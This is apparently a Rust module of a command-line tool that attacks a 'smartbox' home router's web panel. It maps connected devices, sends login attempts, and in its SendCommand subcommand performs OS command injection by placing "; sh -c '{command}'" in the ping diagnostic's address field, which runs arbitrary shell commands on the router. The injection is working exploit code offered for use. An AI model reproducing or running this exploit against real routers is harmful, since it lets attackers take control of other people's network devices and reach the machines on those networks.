use std::io::stdout;

use clap::Subcommand;
use crossterm::{
    execute,
    style::{Color, Print, ResetColor, SetForegroundColor},
};
use serde::Serialize;

use crate::{
    cli::{
        interface::{Module, PanelBaseUrl},
        utils::{b64encode, censor_if, send_http_post_no_response, unspecified_empty, web_get_xml},
    },
    schemas::smartbox::{Device, Devices},
};

#[derive(Debug, Subcommand)]
pub enum Sub {
    /// List devices connected to this network
    NetworkMap {
        #[clap(long, short)]
        censor_sensitive: bool,
    },

    /// Tries to authorize to the router
    TryAuth { login: String, password: String },

    /// Sends command to the router (OS command injection)
    SendCommand { command: String },
}

impl Module for Sub {
    fn execute(&self, base: &Option<String>) {
        match self {
            Self::SendCommand { command } => {
                #[derive(Serialize)]
                struct PingData {
                    ping_ipaddr: String,
                    ping_size: &'static str,
                    ping_number: &'static str,
                    h_ping_number: &'static str,
                    pingmsg: &'static str,
                    todo: &'static str,
                    message: &'static str,
                    this_file: &'static str,
                    next_file: &'static str,
                }

                send_http_post_no_response(
                    self.panel_join(base, "/setup.cgi"),
                    PingData {
                        ping_ipaddr: format!("; sh -c '{command}'"),
                        ping_number: "5",
                        ping_size: "64",
                        pingmsg: "",
                        h_ping_number: "5",
                        todo: "ping_test",
                        message: "",

                        this_file: "mgt_diag.htm",
                        next_file: "mgt_diag.htm",
                    },
                );

                println!(
                    "Sent command, go to {} for the result if desired",
                    self.panel_join(base, "/setup.cgi?next_file=mgt_diagping.htm")
                );
            }

            Self::TryAuth { login, password } => {
                #[derive(Serialize)]
                struct AuthData {
                    un: String,
                    pw: String,
                    todo: &'static str,
                }

                send_http_post_no_response(
                    self.panel_join(base, "/setup.cgi"),
                    AuthData {
                        un: b64encode(login),
                        pw: b64encode(password),
                        todo: "auth",
                    },
                );
                println!("Auth request sent");
            }

            Self::NetworkMap { censor_sensitive } => {
                let result: Devices = web_get_xml(self.panel_join(base, "/quick_networkmap.htm&this_file=quick_networkmap.htm&next_file=quick_networkmap.htm&todo=refresh"));
                for device in result.device_list {
                    let Device::Device {
                        mac,
                        vendor,
                        ip,
                        host_name,
                        description,
                        os,
                        ..
                    } = device;
                    execute!(
                        stdout(),
                        Print("| IP: "),
                        SetForegroundColor(Color::Cyan),
                        Print(&ip),
                        ResetColor,
                        Print("\n| Host name: "),
                        SetForegroundColor(Color::DarkRed),
                        Print(&host_name),
                        ResetColor,
                        Print("\n| Network: "),
                        SetForegroundColor(Color::Red),
                        Print(unspecified_empty(&description)),
                        ResetColor,
                        Print("\n| OS: "),
                        SetForegroundColor(Color::Green),
                        Print(unspecified_empty(&os)),
                        ResetColor,
                        Print("\n| MAC: "),
                        SetForegroundColor(Color::Green),
                        Print(censor_if(*censor_sensitive, &mac)),
                        ResetColor,
                        Print("\n| Vendor: "),
                        SetForegroundColor(Color::Cyan),
                        Print(unspecified_empty(&vendor)),
                        ResetColor,
                        Print("\n---------------\n"),
                    )
                    .unwrap();
                }
            }
        }
    }
}

impl PanelBaseUrl for Sub {
    const BASE_URL: &'static str = "http://192.168.1.1/";
}
